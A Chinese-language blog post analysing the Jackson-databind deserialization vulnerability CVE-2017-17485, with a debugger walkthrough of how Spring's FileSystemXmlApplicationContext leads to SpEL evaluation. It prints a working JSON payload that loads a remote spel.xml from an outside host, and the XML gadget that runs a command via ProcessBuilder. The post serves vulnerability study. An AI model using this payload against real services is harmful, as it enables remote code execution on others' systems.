# Java 反序列化之 Jackson-databind(CVE-2017-17485) - Afant1 - 博客园

> 原文：[`www.cnblogs.com/afanti/p/10203282.html`](https://www.cnblogs.com/afanti/p/10203282.html)

这个洞的 cve 编号：CVE-2017-17485，漏洞环境就如第一个链接那样，jdk 需要在 jdk 1.8 以上。
先看一下 Jackson-databind 的用法，说白了就是将 json 转换成对象。
test-legit.json 代码如下

```
{"id":123} 
```

运行结果如图：
![Alt text](img/bc2ad3735b29019601c5ac0a97348199.png)
如果注入的 json 代码如下代码，就会引入 FileSystemXmlApplicationContext 这个类，去下载 spel.xml：

```
{"id":123, "obj": ["org.springframework.context.support.FileSystemXmlApplicationContext", "https://raw.githubusercontent.com/irsl/jackson-rce-via-spel/master/spel.xml"]} 
```

spel.xml 配置如下：

```
<beans 

  xsi:schemaLocation="
     http://www.springframework.org/schema/beans
     http://www.springframework.org/schema/beans/spring-beans.xsd
">
  <bean id="pb" class="java.lang.ProcessBuilder">
     <constructor-arg value="calc.exe" />
     <property name="whatever" value="#{ pb.start() }"/>
  </bean>
</beans> 
```

下断点调试一下，F7 跟进 readValue 函数。
![Alt text](img/9622443f31a281a9af5707f8d3862cc7.png)
在 readValue 函数就是反序列化 json，一直 f8 以后，在 getBean 下断点后，读取了 id 是 pb 的 bean，也就是 getBean 执行完成后操作导致命令执行了（具体的例子可以看第一个链接）。
![Alt text](img/3803d229708ed2f1fe91d10d81e30c9d.png)
进行表达式评估。
![Alt text](img/6b9d4394e2e8e09995d6c9b89e3c49f3.png)
返回构造函数。
![Alt text](img/de3f59da7d528093ca764d1f1dae75f6.png)
对#{ pb.start() }进行 spel 操作
![Alt text](img/1b2946dbfb4f50498bc86214fd754e76.png)
当解析完 pb.start 操作后就会命令执行
调用栈如下图：
![Alt text](img/3ce6c75a75d21003e6c8ccbfc4091a85.png)

> 说一下为什么引入 FileSystemXmlApplicationContext 类就能操纵 spel
> 先找到 FileSystemXmlApplicationContext 这个类
> ![Alt text](img/b4c174a302410510f4c9fec7419aac4c.png)
> 通过 IntelliJ IDEA 的 Show Diagram Popup 这个功能来观察类和接口的继承关系
> ![Alt text](img/e6599f514b1fbee07e3b174daa7342c5.png)
> 双击 BeanFactory 接口，这个接口有 getBean 方法
> ![Alt text](img/6e63d36449025d962abbca351ef54dfb.png)
> 实际调用 geBean 方法的则是在 AbstractBeanFactory 类中
> ![Alt text](img/a4432613214ee0f5253b4c5780c9e386.png)
> 还有一个 jakson CVE-2017-7525 的洞有时间在跟一下。
> 可以参考这几篇文章：[`xxlegend.com/`](http://xxlegend.com/)
> [`github.com/shengqi158/Jackson-databind-RCE-PoC`](https://github.com/shengqi158/Jackson-databind-RCE-PoC)
> [`blog.nsfocus.net/jackson-framework-java-vulnerability-analysis/`](http://blog.nsfocus.net/jackson-framework-java-vulnerability-analysis/)
> 参考链接：
> [`chenergy1991.github.io/2017/12/25/CVE-2017-7275/`](https://chenergy1991.github.io/2017/12/25/CVE-2017-7275/)
> [`pirogue.org/2018/01/12/jackson-databind-rce/`](http://pirogue.org/2018/01/12/jackson-databind-rce/)
> [`github.com/irsl/jackson-rce-via-spel`](https://github.com/irsl/jackson-rce-via-spel)